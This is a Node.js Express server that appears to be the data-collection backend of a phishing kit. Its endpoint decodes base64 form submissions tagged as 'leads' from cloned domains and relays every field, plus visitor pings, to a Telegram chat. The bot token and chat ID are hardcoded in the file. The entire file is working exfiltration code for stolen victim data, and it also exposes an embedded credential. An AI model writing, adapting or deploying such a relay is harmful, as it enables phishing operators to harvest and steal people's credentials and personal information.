const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");
const cors = require("cors");
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const bot = new TelegramBot("5911775500:AAFiazHmWboL4d_-aLtrpLAXsnqFryMPUME", {
  polling: false,
});

app.use(bodyParser.json());

app.post("/data", (req, res) => {
  try {
    const obj = JSON.parse(atob(req.body.style));

    if (!obj.new) {
      let str = "";
      const where = `New lead from domain:\n${obj.loc}\nOriginal domain:\n${obj.fr}`;

      if (obj.loc) {
        delete obj.loc;
      }

      if (obj.fr) {
        delete obj.fr;
      }

      for (let val in obj) {
        if ((val !== "loc" && val !== "fr", val !== "new")) {
          str += `${
            decodeURIComponent(val) + " : " + decodeURIComponent(obj[val])
          }\n`;
        }
      }

      res.send(sendToTelegram(`${where}\n${str}`));
    } else if (obj.new) {
      res.send(
        sendToTelegram(
          `New visitor on domain:\n${obj.loc}\nOriginal domain:\n${obj.fr}`
        )
      );
    }
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending data to Telegram");
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

function sendToTelegram(str) {
  bot
    .sendMessage("-1001934592493", str)
    .then(() => {
      return "Data sent to Telegram";
    })
    .catch(() => {
      return "Internal server Error";
    });
}

module.exports = app;
